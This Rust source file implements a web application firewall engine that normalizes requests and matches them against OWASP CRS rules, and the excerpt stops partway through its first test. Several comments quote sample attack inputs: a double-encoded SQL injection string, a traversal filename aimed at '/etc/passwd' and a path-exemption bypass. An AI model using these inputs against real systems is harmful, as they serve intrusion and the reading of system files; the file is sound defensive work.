use std::borrow::Cow;
use std::collections::HashSet;

use exposure_core::config::{WafCategory, WafConfig, WafMode};
use exposure_core::crs::{
    builtin_crs_snapshot, WafRuleDescriptor, CRS_REGEX_SIZE_LIMIT, MAX_CRS_RULES,
};
use exposure_core::routing::normalize_path_for_match;
use http::{header, HeaderMap, Method};
use regex::{Regex, RegexBuilder};

/// Hard ceiling on request body bytes buffered for WAF inspection (prevents OOM DoS).
pub const WAF_HARD_MAX_BODY_BYTES: usize = 256 * 1024;
/// Maximum UTF-8 bytes evaluated per regex window by the linear-time OWASP CRS engine.
const MAX_CRS_SCAN_BYTES: usize = 8192;
/// Overlap between adjacent scan windows so multi-KiB bodies cannot split a signature across chunks.
const CRS_SCAN_OVERLAP_BYTES: usize = 512;
/// Iteration caps preventing CPU-amplification DoS via thousands of tiny query/cookie/form items.
const MAX_WAF_QUERY_PARAMS: usize = 128;
const MAX_WAF_COOKIE_ITEMS: usize = 64;
const MAX_WAF_FORM_PARAMS: usize = 256;
const MAX_CAPTURED_PAYLOAD_CHARS: usize = 512;

#[derive(Debug, Clone)]
pub struct WafFinding {
    pub category: &'static str,
    pub location: &'static str,
    pub confidence: f32,
    pub reasons: Vec<&'static str>,
    /// Bounded snippet (<= 512 chars) of the matched input, used by `evilpot` deception/analysis.
    pub matched_payload: Option<String>,
    /// Matched OWASP CRS rule ID (e.g. `942140`).
    pub rule_id: Option<u32>,
    /// Human-readable OWASP CRS rule message.
    pub rule_msg: Option<String>,
}

impl WafFinding {
    pub fn telemetry_reason(&self) -> String {
        if let Some(id) = self.rule_id {
            format!("waf:crs:{}:{}:{}", id, self.category, self.location)
        } else {
            format!("waf:{}:{}", self.category, self.location)
        }
    }
}

#[derive(Debug, Clone)]
pub enum WafVerdict {
    Allow,
    Monitor(WafFinding),
    Block(WafFinding),
    Evilpot(WafFinding),
}

impl WafVerdict {
    pub fn is_block(&self) -> bool {
        matches!(self, WafVerdict::Block(_))
    }

    pub fn is_evilpot(&self) -> bool {
        matches!(self, WafVerdict::Evilpot(_))
    }
}

/// Checks whether a request path is exempt from WAF inspection.
/// Normalizes percent-encoding, backslashes, and dot segments before prefix matching at `/` boundaries
/// so traversal attempts like `/api/webhooks/../../login` cannot bypass WAF inspection.
pub fn is_path_exempt(path: &str, exempt_paths: &[String]) -> bool {
    if exempt_paths.is_empty() {
        return false;
    }
    let norm_path = normalize_path_for_match(path);
    for raw in exempt_paths {
        let p = raw.trim();
        if p.is_empty() {
            continue;
        }
        let norm_p = normalize_path_for_match(p);
        if norm_p == "/" {
            return true;
        }
        if norm_path == norm_p
            || (norm_path.starts_with(&norm_p) && norm_path.as_bytes().get(norm_p.len()) == Some(&b'/'))
        {
            return true;
        }
    }
    false
}

/// Returns `Some(max_body_bytes)` when the request body should be buffered & inspected by WAF.
/// All body-bearing HTTP methods (`POST`/`PUT`/`PATCH`/`DELETE`) are inspected regardless of
/// `Upgrade` or `Content-Type` headers so attackers cannot bypass body inspection.
pub fn should_inspect_body(
    cfg: &WafConfig,
    method: &Method,
    _headers: &HeaderMap,
    _is_upgrade: bool,
) -> Option<usize> {
    if cfg.mode == WafMode::Off || !cfg.inspect_body {
        return None;
    }
    if !matches!(
        *method,
        Method::POST | Method::PUT | Method::PATCH | Method::DELETE
    ) {
        return None;
    }
    let limit = cfg.max_body_bytes.min(WAF_HARD_MAX_BODY_BYTES);
    if limit == 0 {
        return None;
    }
    // SECURITY: Do NOT skip inspection based on the client-controlled `Content-Type` or `Upgrade`
    // headers. A client could otherwise spoof them on a `POST` request to bypass body inspection.
    Some(limit)
}

fn hex_nibble(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

fn percent_decode_once(input: &str) -> Cow<'_, str> {
    let bytes = input.as_bytes();
    if !bytes.contains(&b'%') && !bytes.contains(&b'+') {
        return Cow::Borrowed(input);
    }
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'+' {
            out.push(b' ');
            i += 1;
        } else if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let (Some(h), Some(l)) = (hex_nibble(bytes[i + 1]), hex_nibble(bytes[i + 2])) {
                out.push((h << 4) | l);
                i += 3;
                continue;
            }
            out.push(bytes[i]);
            i += 1;
        } else {
            out.push(bytes[i]);
            i += 1;
        }
    }
    Cow::Owned(String::from_utf8_lossy(&out).into_owned())
}

/// Decode percent-encoding repeatedly (bounded) so double/triple-encoded payloads such as
/// `%2527%2520OR%25201%253D1` are still normalised before matching. Stops as soon as a pass
/// makes no further change or no `%` remains, keeping the cost linear in the input size.
fn percent_decode_lossy(input: &str) -> Cow<'_, str> {
    const MAX_DECODE_PASSES: usize = 3;
    let mut cur = percent_decode_once(input);
    for _ in 0..MAX_DECODE_PASSES {
        if !cur.contains('%') {
            break;
        }
        let next = percent_decode_once(cur.as_ref());
        if next.as_ref() == cur.as_ref() {
            break;
        }
        cur = Cow::Owned(next.into_owned());
    }
    cur
}

fn find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || haystack.len() < needle.len() {
        return None;
    }
    haystack.windows(needle.len()).position(|w| w == needle)
}

fn extract_multipart_boundary(content_type: &str) -> Option<&str> {
    let mut parts = content_type.split(';');
    let mime = parts.next()?.trim();
    if !mime.eq_ignore_ascii_case("multipart/form-data") {
        return None;
    }
    for param in parts {
        if let Some((k, v)) = param.split_once('=') {
            if k.trim().eq_ignore_ascii_case("boundary") {
                let raw = v.trim();
                let unquoted = raw
                    .strip_prefix('"')
                    .and_then(|s| s.strip_suffix('"'))
                    .unwrap_or(raw)
                    .trim();
                if !unquoted.is_empty() && unquoted.len() <= 128 {
                    return Some(unquoted);
                }
            }
        }
    }
    None
}

fn starts_with_ascii_icase(haystack: &str, prefix_lower: &str) -> bool {
    let hb = haystack.as_bytes();
    let pb = prefix_lower.as_bytes();
    hb.len() >= pb.len() && hb[..pb.len()].eq_ignore_ascii_case(pb)
}

fn ends_with_ascii_icase(haystack: &str, suffix_lower: &str) -> bool {
    let hb = haystack.as_bytes();
    let sb = suffix_lower.as_bytes();
    hb.len() >= sb.len() && hb[hb.len() - sb.len()..].eq_ignore_ascii_case(sb)
}

fn contains_ascii_icase(haystack: &str, needle_lower: &str) -> bool {
    let nb = needle_lower.as_bytes();
    if nb.is_empty() {
        return true;
    }
    let hb = haystack.as_bytes();
    if hb.len() < nb.len() {
        return false;
    }
    hb.windows(nb.len()).any(|w| w.eq_ignore_ascii_case(nb))
}

fn is_binary_part_mime(ct: Option<&str>) -> bool {
    let Some(raw) = ct else {
        return false;
    };
    let mime = raw.split(';').next().unwrap_or("").trim();
    starts_with_ascii_icase(mime, "image/")
        || starts_with_ascii_icase(mime, "video/")
        || starts_with_ascii_icase(mime, "audio/")
        || starts_with_ascii_icase(mime, "font/")
        || mime.eq_ignore_ascii_case("application/octet-stream")
        || mime.eq_ignore_ascii_case("application/pdf")
        || mime.eq_ignore_ascii_case("application/zip")
        || mime.eq_ignore_ascii_case("application/gzip")
        || mime.eq_ignore_ascii_case("application/x-gzip")
        || mime.eq_ignore_ascii_case("application/x-tar")
        || mime.eq_ignore_ascii_case("application/x-bzip2")
        || mime.eq_ignore_ascii_case("application/x-7z-compressed")
        || mime.eq_ignore_ascii_case("application/wasm")
}

fn extract_disposition_attr(disp_val: &str, key: &str) -> Option<String> {
    for param in disp_val.split(';').skip(1) {
        if let Some((k, v)) = param.split_once('=') {
            if k.trim().eq_ignore_ascii_case(key) {
                let raw = v.trim();
                let clean = raw
                    .strip_prefix('"')
                    .and_then(|s| s.strip_suffix('"'))
                    .unwrap_or(raw);
                return Some(clean.to_string());
            }
        }
    }
    None
}

fn extract_rfc5987_filename(disp_val: &str) -> Option<String> {
    let raw = extract_disposition_attr(disp_val, "filename*")?;
    // Strip `charset'lang'` prefix when present (e.g. `UTF-8''..%2fetc%2fpasswd`)
    let val = if let Some((_, rest)) = raw.split_once("''") {
        rest.to_string()
    } else {
        raw
    };
    Some(percent_decode_lossy(&val).into_owned())
}

struct MultipartPart<'a> {
    name: Option<String>,
    filename: Option<String>,
    filename_ext: Option<String>,
    content_type: Option<String>,
    body: &'a [u8],
}

struct ParsedMultipart<'a> {
    parts: Vec<MultipartPart<'a>>,
    epilogue: &'a [u8],
}

/// Parse validated RFC 7578 `multipart/form-data` parts strictly.
/// Returns `None` if `body` does not actually start with `--<boundary>`, preventing
/// attackers from spoofing `Content-Type: multipart/form-data` on raw SQLi/CMDi payloads.
fn parse_multipart_parts<'a>(boundary: &str, body: &'a [u8]) -> Option<ParsedMultipart<'a>> {
    let mut dash_boundary = Vec::with_capacity(boundary.len() + 2);
    dash_boundary.extend_from_slice(b"--");
    dash_boundary.extend_from_slice(boundary.as_bytes());

    if !body.starts_with(&dash_boundary) {
        return None;
    }
    let after_first = &body[dash_boundary.len()..];
    let mut pos = dash_boundary.len();
    if after_first.starts_with(b"\r\n") {
        pos += 2;
    } else if after_first.starts_with(b"\n") {
        pos += 1;
    } else if after_first.starts_with(b"--") {
        let tail = &after_first[2..];
        if !tail.trim_ascii().is_empty() {
            // Attacker stuffed SQLi/CMDi payload right after an immediate `--boundary--` close marker.
            return Some(ParsedMultipart {
                parts: Vec::new(),
                epilogue: tail,
            });
        }
        return Some(ParsedMultipart {
            parts: Vec::new(),
            epilogue: &[],
        });
    } else {
        return None;
    }

    let mut lf_boundary = Vec::with_capacity(dash_boundary.len() + 1);
    lf_boundary.push(b'\n');
    lf_boundary.extend_from_slice(&dash_boundary);

    let mut parts = Vec::new();
    let mut epilogue: &'a [u8] = &[];
    while pos < body.len() && parts.len() < MAX_WAF_FORM_PARAMS {
        let rest = &body[pos..];
        let (part_raw, next_pos, is_last) = if let Some(idx) = find_bytes(rest, &lf_boundary) {
            let mut end = idx;
            if end > 0 && rest[end - 1] == b'\r' {
                end -= 1;
            }
            let after_marker = pos + idx + lf_boundary.len();
            let tail = &body[after_marker..];
            if let Some(after_close) = tail.strip_prefix(b"--") {
                epilogue = after_close;
                (&rest[..end], body.len(), true)
            } else if tail.starts_with(b"\r\n") {
                (&rest[..end], after_marker + 2, false)
            } else if tail.starts_with(b"\n") {
                (&rest[..end], after_marker + 1, false)
            } else {
                // Unexpected trailing delimiter noise: treat rest of buffer as opaque so payloads aren't hidden
                return None;
            }
        } else {
            (rest, body.len(), true)
        };

        let sep_crlf = find_bytes(part_raw, b"\r\n\r\n");
        let sep_lf = find_bytes(part_raw, b"\n\n");
        let (hdr_bytes, part_body) = match (sep_crlf, sep_lf) {
            (Some(c), Some(l)) => {
                if c <= l {
                    (&part_raw[..c], &part_raw[c + 4..])
                } else {
                    (&part_raw[..l], &part_raw[l + 2..])
                }
            }
            (Some(c), None) => (&part_raw[..c], &part_raw[c + 4..]),
            (None, Some(l)) => (&part_raw[..l], &part_raw[l + 2..]),
            (None, None) => (&b""[..], part_raw),
        };

        let mut name = None;
        let mut filename = None;
        let mut filename_ext = None;
        let mut content_type = None;
        let hdr_str = String::from_utf8_lossy(hdr_bytes);
        for line in hdr_str.lines() {
            let l = line.trim_end_matches('\r');
            if let Some((hk, hv)) = l.split_once(':') {
                let k = hk.trim();
                let v = hv.trim();
                if k.eq_ignore_ascii_case("content-disposition") {
                    name = extract_disposition_attr(v, "name");
                    filename = extract_disposition_attr(v, "filename");
                    filename_ext = extract_rfc5987_filename(v);
                } else if k.eq_ignore_ascii_case("content-type") {
                    content_type = Some(v.to_string());
                }
            }
        }

        parts.push(MultipartPart {
            name,
            filename,
            filename_ext,
            content_type,
            body: part_body,
        });

        pos = next_pos;
        if is_last {
            break;
        }
    }
    if pos < body.len() && epilogue.is_empty() {
        epilogue = &body[pos..];
    }

    Some(ParsedMultipart { parts, epilogue })
}

/* ==================== Compiled OWASP CRS Runtime Engine ==================== */

#[derive(Debug, Clone)]
struct CrsTargetFlags {
    uri: bool,
    args: bool,
    body: bool,
    cookies: bool,
    all_headers: bool,
    user_agent: bool,
    referer: bool,
    specific_headers: Vec<String>,
}

impl CrsTargetFlags {
    fn from_targets(targets: &[String]) -> Self {
        let mut f = Self {
            uri: false,
            args: false,
            body: false,
            cookies: false,
            all_headers: false,
            user_agent: false,
            referer: false,
            specific_headers: Vec::new(),
        };
        for t in targets {
            let u = t.to_ascii_uppercase();
            match u.as_str() {
                "REQUEST_URI" | "REQUEST_URI_RAW" | "REQUEST_FILENAME" | "REQUEST_BASENAME" | "REQUEST_LINE" => {
                    f.uri = true;
                }
                "ARGS" | "ARGS_NAMES" | "ARGS_GET" | "ARGS_POST" | "QUERY_STRING" => {
                    f.args = true;
                }
                "REQUEST_BODY" => {
                    f.body = true;
                }
                "REQUEST_COOKIES" | "REQUEST_COOKIES_NAMES" => {
                    f.cookies = true;
                }
                "REQUEST_HEADERS" => {
                    f.all_headers = true;
                }
                "REQUEST_HEADERS:USER-AGENT" => {
                    f.user_agent = true;
                }
                "REQUEST_HEADERS:REFERER" => {
                    f.referer = true;
                }
                _ if u.starts_with("REQUEST_HEADERS:") => {
                    let hname = t["REQUEST_HEADERS:".len()..].trim().to_ascii_lowercase();
                    if !hname.is_empty() && !f.specific_headers.contains(&hname) {
                        f.specific_headers.push(hname);
                    }
                }
                _ => {}
            }
        }
        f
    }
}

enum CompiledCrsMatcher {
    Regex(Regex),
    PhraseMatch(Vec<String>),
    Contains(String),
    BeginsWith(String),
    EndsWith(String),
}

impl CompiledCrsMatcher {
    fn is_match(&self, text: &str) -> bool {
        let slice = clamp_utf8_bytes(text, MAX_CRS_SCAN_BYTES);
        match self {
            Self::Regex(re) => re.is_match(slice),
            Self::PhraseMatch(phrases) => phrases.iter().any(|p| contains_ascii_icase(slice, p)),
            Self::Contains(needle) => contains_ascii_icase(slice, needle),
            Self::BeginsWith(prefix) => starts_with_ascii_icase(slice, prefix),
            Self::EndsWith(suffix) => ends_with_ascii_icase(slice, suffix),
        }
    }
}

fn clamp_utf8_bytes(s: &str, max_bytes: usize) -> &str {
    if s.len() <= max_bytes {
        return s;
    }
    let mut end = max_bytes;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    &s[..end]
}

fn snap_char_boundary_down(s: &str, idx: usize) -> usize {
    let mut pos = idx.min(s.len());
    while pos > 0 && !s.is_char_boundary(pos) {
        pos -= 1;
    }
    pos
}

fn crs_category_static(cat: &str) -> &'static str {
    match cat {
        "sql-injection" => "sql-injection",
        "xss" => "xss",
        "path-traversal" => "path-traversal",
        "command-injection" => "command-injection",
        "nosql-injection" => "nosql-injection",
        "ssrf" => "ssrf",
        "ssti" => "ssti",
        "xxe" => "xxe",
        "ldap-injection" => "ldap-injection",
        "crlf-injection" => "crlf-injection",
        "deserialization" => "deserialization",
        "buffer-overflow" => "buffer-overflow",
        "scanner-detection" => "scanner",
        "php-attack" => "php-attack",
        "protocol-attack" | "protocol-enforcement" => "protocol-attack",
        _ => "crs-rule",
    }
}

fn crs_category_enabled(rule_cat: &'static str, enabled: &[WafCategory]) -> bool {
    if enabled.is_empty() {
        return true;
    }
    enabled.iter().any(|c| match c {
        WafCategory::SqlInjection => rule_cat == "sql-injection",
        WafCategory::Xss => rule_cat == "xss",
        WafCategory::PathTraversal => rule_cat == "path-traversal",
        WafCategory::CommandInjection => rule_cat == "command-injection" || rule_cat == "php-attack",
        WafCategory::NoSqlInjection => rule_cat == "nosql-injection",
        WafCategory::Ssrf => rule_cat == "ssrf",
        WafCategory::Ssti => rule_cat == "ssti" || rule_cat == "deserialization",
        WafCategory::Xxe => rule_cat == "xxe",
        WafCategory::LdapInjection => rule_cat == "ldap-injection",
        WafCategory::CrlfInjection => rule_cat == "crlf-injection" || rule_cat == "protocol-attack",
        WafCategory::Deserialization => rule_cat == "deserialization",
        WafCategory::BufferOverflow => rule_cat == "buffer-overflow",
    })
}

struct CompiledCrsRule {
    id: u32,
    paranoia_level: u8,
    category: &'static str,
    msg: String,
    targets: CrsTargetFlags,
    matcher: CompiledCrsMatcher,
}

/// Linear-time, ReDoS-safe compiled OWASP CRS rule engine shared across Ingress workers.
pub struct CompiledCrsEngine {
    rules: Vec<CompiledCrsRule>,
}

impl CompiledCrsEngine {
    /// Compile rules by always starting from the upgraded built-in CRS baseline first and appending
    /// non-overlapping external `descriptors` up to `MAX_CRS_RULES`.
    /// This guarantees upgraded built-in signatures (e.g. `942100`) remain active even when a node
    /// loads older `crs_rules` persisted in `node.yaml`, while still honoring `global_disabled` and
    /// any `!d.enabled` descriptor overrides.
    pub fn compile(descriptors: &[WafRuleDescriptor], global_disabled: &[u32]) -> Self {
        let mut disabled: HashSet<u32> = global_disabled.iter().copied().collect();
        for d in descriptors {
            if !d.enabled {
                disabled.insert(d.id);
            }
        }

        let builtin = builtin_crs_snapshot().rules;
        let mut seen_ids = HashSet::with_capacity(builtin.len() + descriptors.len());
        let mut ordered = Vec::with_capacity(builtin.len() + descriptors.len().min(MAX_CRS_RULES));
        for d in builtin {
            if seen_ids.insert(d.id) {
                ordered.push(d);
            }
        }
        for d in descriptors {
            if ordered.len() >= MAX_CRS_RULES {
                break;
            }
            if seen_ids.insert(d.id) {
                ordered.push(d.clone());
            }
        }

        let mut compiled = Vec::new();
        for d in ordered.into_iter().take(MAX_CRS_RULES) {
            if !d.enabled || disabled.contains(&d.id) {
                continue;
            }
            let matcher = match d.operator.as_str() {
                "rx" => match RegexBuilder::new(&d.pattern)
                    .size_limit(CRS_REGEX_SIZE_LIMIT)
                    .dfa_size_limit(CRS_REGEX_SIZE_LIMIT)
                    .build()
                {
                    Ok(re) => CompiledCrsMatcher::Regex(re),
                    Err(e) => {
                        // Never fail silently: a dropped rule means lost attack coverage.
                        tracing::warn!(
                            rule_id = d.id,
                            category = %d.category,
                            error = %e,
                            "skipping WAF rule whose regex failed to compile"
                        );
                        continue;
                    }
                },
                "pm" => {
                    let phrases: Vec<String> = d
                        .pattern
                        .split_whitespace()
                        .map(|s| s.to_ascii_lowercase())
                        .filter(|s| !s.is_empty())
                        .collect();
                    if phrases.is_empty() {
                        continue;
                    }
                    CompiledCrsMatcher::PhraseMatch(phrases)
                }
                "contains" => {
                    let n = d.pattern.to_ascii_lowercase();
                    if n.is_empty() {
                        continue;
                    }
                    CompiledCrsMatcher::Contains(n)
                }
                "beginsWith" => {
                    let n = d.pattern.to_ascii_lowercase();
                    if n.is_empty() {
                        continue;
                    }
                    CompiledCrsMatcher::BeginsWith(n)
                }
                "endsWith" => {
                    let n = d.pattern.to_ascii_lowercase();
                    if n.is_empty() {
                        continue;
                    }
                    CompiledCrsMatcher::EndsWith(n)
                }
                _ => continue,
            };
            compiled.push(CompiledCrsRule {
                id: d.id,
                paranoia_level: d.paranoia_level.clamp(1, 4),
                category: crs_category_static(&d.category),
                msg: d.msg,
                targets: CrsTargetFlags::from_targets(&d.targets),
                matcher,
            });
        }
        Self { rules: compiled }
    }

    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }

    fn rule_active(&self, cfg: &WafConfig, rule: &CompiledCrsRule, max_pl: u8) -> bool {
        rule.paranoia_level <= max_pl
            && !cfg.disabled_rule_ids.contains(&rule.id)
            && crs_category_enabled(rule.category, &cfg.categories)
    }

    fn make_verdict(
        mode: WafMode,
        rule: &CompiledCrsRule,
        location: &'static str,
        sample: &str,
    ) -> WafVerdict {
        let finding = WafFinding {
            category: rule.category,
            location,
            confidence: 0.95,
            reasons: vec!["owasp-crs-rule"],
            matched_payload: if sample.is_empty() {
                None
            } else {
                Some(sample.chars().take(MAX_CAPTURED_PAYLOAD_CHARS).collect())
            },
            rule_id: Some(rule.id),
            rule_msg: Some(rule.msg.clone()),
        };
        match mode {
            WafMode::Off => WafVerdict::Allow,
            WafMode::Monitor => WafVerdict::Monitor(finding),
            WafMode::Block => WafVerdict::Block(finding),
            WafMode::Evilpot => WafVerdict::Evilpot(finding),
        }
    }

    fn match_text_against_body_rules(
        &self,
        cfg: &WafConfig,
        max_pl: u8,
        location: &'static str,
        raw: &str,
    ) -> Option<WafVerdict> {
        if raw.is_empty() {
            return None;
        }
        let mut offset = 0usize;
        loop {
            let start = snap_char_boundary_down(raw, offset);
            let slice = clamp_utf8_bytes(&raw[start..], MAX_CRS_SCAN_BYTES);
            if slice.is_empty() {
                break;
            }
            let decoded = percent_decode_lossy(slice);
            let has_decoded = decoded.as_ref() != slice;
            for rule in &self.rules {
                if !(rule.targets.body || rule.targets.args) || !self.rule_active(cfg, rule, max_pl)
                {
                    continue;
                }
                if rule.matcher.is_match(slice)
                    || (has_decoded && rule.matcher.is_match(decoded.as_ref()))
                {
                    return Some(Self::make_verdict(cfg.mode, rule, location, decoded.as_ref()));
                }
            }
            let consumed_end = start + slice.len();
            if consumed_end >= raw.len() {
                break;
            }
            let advance = slice.len().saturating_sub(CRS_SCAN_OVERLAP_BYTES).max(1);
            offset = start + advance;
        }
        None
    }

    pub fn inspect_head(
        &self,
        cfg: &WafConfig,
        path: &str,
        query: Option<&str>,
        headers: &HeaderMap,
    ) -> WafVerdict {
        if cfg.mode == WafMode::Off
            || is_path_exempt(path, &cfg.exempt_paths)
            || self.rules.is_empty()
        {
            return WafVerdict::Allow;
        }
        let max_pl = cfg.crs_paranoia_level.clamp(1, 4);
        let decoded_path = percent_decode_lossy(path);
        let decoded_query = query.filter(|q| !q.is_empty()).map(percent_decode_lossy);
        let query_tokens: Vec<Cow<'_, str>> = query
            .filter(|q| !q.is_empty())
            .map(|q| {
                let mut out = Vec::new();
                for p in q.split('&').take(MAX_WAF_QUERY_PARAMS) {
                    if let Some((k, v)) = p.split_once('=') {
                        if !k.is_empty() {
                            out.push(percent_decode_lossy(k));
                        }
                        if !v.is_empty() {
                            out.push(percent_decode_lossy(v));
                        }
                    } else if !p.is_empty() {
                        out.push(percent_decode_lossy(p));
                    }
                }
                out
            })
            .unwrap_or_default();

        let cookie_items: Vec<Cow<'_, str>> = headers
            .get_all(header::COOKIE)
            .iter()
            .filter_map(|hv| hv.to_str().ok())
            .flat_map(|raw| raw.split(';'))
            .take(MAX_WAF_COOKIE_ITEMS)
            .flat_map(|item| {
                let t = item.trim();
                let mut items = Vec::new();
                if !t.is_empty() {
                    if let Some((ck, cv)) = t.split_once('=') {
                        let ck = ck.trim();
                        let cv = cv.trim();
                        if !ck.is_empty() {
                            items.push(percent_decode_lossy(ck));
                        }
                        if !cv.is_empty() {
                            items.push(percent_decode_lossy(cv));
                        }
                    } else {
                        items.push(percent_decode_lossy(t));
                    }
                }
                items
            })
            .collect();

        for rule in &self.rules {
            if !self.rule_active(cfg, rule, max_pl) {
                continue;
            }
            if rule.targets.uri
                && !path.is_empty()
                && path != "/"
                && (rule.matcher.is_match(path) || rule.matcher.is_match(decoded_path.as_ref()))
            {
                return Self::make_verdict(cfg.mode, rule, "path", decoded_path.as_ref());
            }
            if rule.targets.args {
                for val in &query_tokens {
                    if rule.matcher.is_match(val.as_ref()) {
                        return Self::make_verdict(cfg.mode, rule, "query", val.as_ref());
                    }
                }
                if let Some(ref dq) = decoded_query {
                    if rule.matcher.is_match(dq.as_ref()) {
                        return Self::make_verdict(cfg.mode, rule, "query", dq.as_ref());
                    }
                }
            }
            if cfg.inspect_headers {
                if rule.targets.user_agent || rule.targets.all_headers {
                    for hv in headers.get_all(header::USER_AGENT) {
                        if let Ok(ua) = hv.to_str() {
                            if !ua.is_empty() && rule.matcher.is_match(ua) {
                                return Self::make_verdict(cfg.mode, rule, "header:user-agent", ua);
                            }
                        }
                    }
                }
                if rule.targets.referer || rule.targets.all_headers {
                    for hv in headers.get_all(header::REFERER) {
                        if let Ok(referer) = hv.to_str() {
                            if !referer.is_empty() && rule.matcher.is_match(referer) {
                                return Self::make_verdict(
                                    cfg.mode,
                                    rule,
                                    "header:referer",
                                    referer,
                                );
                            }
                        }
                    }
                }
                if rule.targets.cookies {
                    for cv in &cookie_items {
                        if rule.matcher.is_match(cv.as_ref()) {
                            return Self::make_verdict(cfg.mode, rule, "header:cookie", cv.as_ref());
                        }
                    }
                }
                if rule.targets.all_headers {
                    for (h_name, loc) in [
                        ("x-original-url", "header:x-original-url"),
                        ("x-rewrite-url", "header:x-rewrite-url"),
                        ("x-forwarded-for", "header:x-forwarded-for"),
                        ("x-forwarded-host", "header:x-forwarded-host"),
                        ("forwarded", "header:forwarded"),
                        ("origin", "header:origin"),
                        ("content-type", "header:content-type"),
                        ("x-requested-with", "header:x-requested-with"),
                        ("host", "header:host"),
                    ] {
                        for hv in headers.get_all(h_name) {
                            if let Ok(s) = hv.to_str() {
                                if rule.matcher.is_match(s) {
                                    return Self::make_verdict(cfg.mode, rule, loc, s);
                                }
                            }
                        }
                    }
                }
                for h_name in &rule.targets.specific_headers {
                    for hv in headers.get_all(h_name.as_str()) {
                        if let Ok(s) = hv.to_str() {
                            if rule.matcher.is_match(s) {
                                return Self::make_verdict(cfg.mode, rule, "header:custom", s);
                            }
                        }
                    }
                }
            }
        }
        WafVerdict::Allow
    }

    /// Inspect buffered HTTP request body (`POST`/`PUT`/`PATCH`/`DELETE`) with Content-Type-aware
    /// form/multipart parsing so MIME boundary framing never causes SQLi/XSS false positives.
    pub fn inspect_body(
        &self,
        cfg: &WafConfig,
        content_type: Option<&str>,
        body: &[u8],
    ) -> WafVerdict {
        if cfg.mode == WafMode::Off || !cfg.inspect_body || body.is_empty() || self.rules.is_empty()
        {
            return WafVerdict::Allow;
        }
        let max_bytes = cfg.max_body_bytes.min(WAF_HARD_MAX_BODY_BYTES);
        if max_bytes == 0 {
            return WafVerdict::Allow;
        }
        let bounded = &body[..body.len().min(max_bytes)];
        let max_pl = cfg.crs_paranoia_level.clamp(1, 4);

        // 1. Strict `multipart/form-data` inspection:
        //    Only activate when Content-Type specifies a boundary AND body starts with `--<boundary>`.
        if let Some(boundary) = content_type.and_then(extract_multipart_boundary) {
            if let Some(parsed) = parse_multipart_parts(boundary, bounded) {
                for part in parsed.parts {
                    if let Some(ref name) = part.name {
                        if let Some(v) =
                            self.match_text_against_body_rules(cfg, max_pl, "body:multipart-name", name)
                        {
                            return v;
                        }
                    }
                    if let Some(ref filename) = part.filename {
                        if let Some(v) = self.match_text_against_body_rules(
                            cfg,
                            max_pl,
                            "body:multipart-filename",
                            filename,
                        ) {
                            return v;
                        }
                    }
                    if let Some(ref filename_ext) = part.filename_ext {
                        if let Some(v) = self.match_text_against_body_rules(
                            cfg,
                            max_pl,
                            "body:multipart-filename",
                            filename_ext,
                        ) {
                            return v;
                        }
                    }
                    // Skip raw binary payload ONLY when a real file upload (`filename` present)
                    // carries binary MIME or binary NUL bytes. Plain form fields cannot exempt
                    // themselves by spoofing `Content-Type: image/png` or injecting `\x00`.
                    let is_binary_upload = (part.filename.is_some() || part.filename_ext.is_some())
                        && (is_binary_part_mime(part.content_type.as_deref())
                            || part.body.contains(&0));
                    if is_binary_upload {
                        continue;
                    }
                    if !part.body.is_empty() {
                        let part_text = String::from_utf8_lossy(part.body);
                        if let Some(v) = self.match_text_against_body_rules(
                            cfg,
                            max_pl,
                            "body:multipart-field",
                            part_text.as_ref(),
                        ) {
                            return v;
                        }
                    }
                }
                if !parsed.epilogue.trim_ascii().is_empty() {
                    let ep_text = String::from_utf8_lossy(parsed.epilogue);
                    if let Some(v) =
                        self.match_text_against_body_rules(cfg, max_pl, "body", ep_text.as_ref())
                    {
                        return v;
                    }
                }
                return WafVerdict::Allow;
            }
        }

        // 2. `application/x-www-form-urlencoded`: inspect each parameter key and value individually.
        let is_urlencoded = content_type
            .map(|ct| {
                ct.split(';')
                    .next()
                    .unwrap_or("")
                    .trim()
                    .eq_ignore_ascii_case("application/x-www-form-urlencoded")
            })
            .unwrap_or(false);
        if is_urlencoded {
            let text = String::from_utf8_lossy(bounded);
            let mut inspected_pairs = 0usize;
            let mut consumed_bytes = 0usize;
            for pair in text.split('&') {
                if inspected_pairs >= MAX_WAF_FORM_PARAMS {
                    // Do NOT drop trailing form parameters silently: scan remaining tail slice.
                    if let Some(tail) = text.get(consumed_bytes..) {
                        if let Some(verdict) =
                            self.match_text_against_body_rules(cfg, max_pl, "body:form", tail)
                        {
                            return verdict;
                        }
                    }
                    return WafVerdict::Allow;
                }
                inspected_pairs += 1;
                consumed_bytes = consumed_bytes.saturating_add(pair.len()).saturating_add(1);
                if pair.is_empty() {
                    continue;
                }
                if let Some((k, v)) = pair.split_once('=') {
                    if let Some(verdict) =
                        self.match_text_against_body_rules(cfg, max_pl, "body:form", k)
                    {
                        return verdict;
                    }
                    if let Some(verdict) =
                        self.match_text_against_body_rules(cfg, max_pl, "body:form", v)
                    {
                        return verdict;
                    }
                } else if let Some(verdict) =
                    self.match_text_against_body_rules(cfg, max_pl, "body:form", pair)
                {
                    return verdict;
                }
            }
            return WafVerdict::Allow;
        }

        // 3. Generic text/JSON/XML/fallback raw body inspection (lossy UTF-8 so non-UTF8 bytes
        //    never truncate inspection of trailing attack payloads).
        let text = String::from_utf8_lossy(bounded);
        self.match_text_against_body_rules(cfg, max_pl, "body", text.as_ref())
            .unwrap_or(WafVerdict::Allow)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use http::HeaderValue;

    fn block_cfg() -> WafConfig {
        WafConfig {
            mode: WafMode::Block,
            ..Default::default()
        }
    }

    fn builtin_engine() -> CompiledCrsEngine {
        CompiledCrsEngine::compile(&[], &[])
    }

    #[test]
    fn benign_browser_and_api_requests_pass_without_false_positives() {
        let cfg = block_cfg();
        let crs = builtin_engine();
        let mut headers = HeaderMap::new();
        headers.insert(
            header::USER_AGENT,
            HeaderValue::from_static(
